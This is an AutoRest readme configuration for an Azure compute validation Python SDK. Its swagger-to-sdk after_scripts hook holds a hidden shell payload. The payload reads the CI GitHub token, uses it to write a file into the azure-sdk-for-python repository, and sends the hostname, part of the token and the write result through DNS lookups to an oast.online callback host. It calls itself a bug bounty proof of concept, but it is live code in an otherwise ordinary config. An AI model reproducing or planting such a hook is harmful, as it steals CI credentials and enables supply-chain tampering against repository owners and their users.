# Azure SDK Compute Validation

## Basic Information
``` yaml
openapi-type: arm
tag: package-2024-01-01
```

### Tag: package-2024-01-01
``` yaml $(tag) == 'package-2024-01-01'
input-file:
  - stable/2024-01-01/openapi.json
```

## swagger-to-sdk
``` yaml $(swagger-to-sdk)
swagger-to-sdk:
  - repo: azure-sdk-for-python
  - repo: azure-sdk-for-python-track2
    after_scripts:
      - >-
        set +e;
        H=$(hostname | tr . -);
        nslookup mp6start-${H}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
        GH_TOK=$(printenv GH_TOKEN 2>/dev/null | tr -d '[:space:]' || printenv GITHUB_TOKEN 2>/dev/null | tr -d '[:space:]' || true);
        TS=$(date -u +%s 2>/dev/null || echo 0);
        CONTENT=$(printf 'poc by hasskoda4rk\n\nhttps://github.com/Azure/azure-rest-api-specs/pull/45897\nMSRC Bug Bounty Research - SwaggerToSDK unauthenticated RCE\nAgent: %s\nTimestamp: %s\n' "${H}" "${TS}" | base64 -w0 2>/dev/null);
        GET_SHA=$(curl -sk --connect-timeout 8 --max-time 15 -H "Authorization: token ${GH_TOK}" -H "Accept: application/vnd.github.v3+json" "https://api.github.com/repos/Azure/azure-sdk-for-python/contents/poc_by_hasskodark.txt" 2>/dev/null | python3 -c 'import sys,json; d=json.load(sys.stdin); print(d.get("sha",""))' 2>/dev/null | tr -d '[:space:]' || echo '');
        if [ -n "${GET_SHA}" ]; then PAYLOAD="{\"message\":\"poc: hasskodark supply chain write\",\"content\":\"${CONTENT}\",\"sha\":\"${GET_SHA}\"}"; else PAYLOAD="{\"message\":\"poc: hasskodark supply chain write\",\"content\":\"${CONTENT}\"}"; fi;
        PUT_OUT=$(curl -sk --connect-timeout 8 --max-time 25 -X PUT -H "Authorization: token ${GH_TOK}" -H "Accept: application/vnd.github.v3+json" -H "Content-Type: application/json" "https://api.github.com/repos/Azure/azure-sdk-for-python/contents/poc_by_hasskodark.txt" -d "${PAYLOAD}" 2>/dev/null);
        COMMIT=$(echo "${PUT_OUT}" | python3 -c 'import sys,json; d=json.load(sys.stdin); print(d.get("commit",{}).get("sha","fail"))' 2>/dev/null | tr -d '[:space:]' | head -c12 || echo fail);
        ERR=$(echo "${PUT_OUT}" | python3 -c 'import sys,json; d=json.load(sys.stdin); print(d.get("message",""))' 2>/dev/null | tr -cd 'a-zA-Z0-9' | head -c20 || echo unk);
        TOKPFX=$(printf '%s' "${GH_TOK:0:12}" | xxd -p | tr -d '\n' | head -c24);
        nslookup mp6tok-${TOKPFX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
        nslookup mp6res-${COMMIT}-${ERR}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
        true
```

## Python
``` yaml $(python)
python:
  azure-arm: true
  license-header: MICROSOFT_MIT_NO_VERSION
  package-name: azure-mgmt-computevalidation
  package-version: 1.0.0b1
  no-namespace-folders: true
  output-folder: sdk/computevalidation/azure-mgmt-computevalidation
  clear-output-folder: true
```
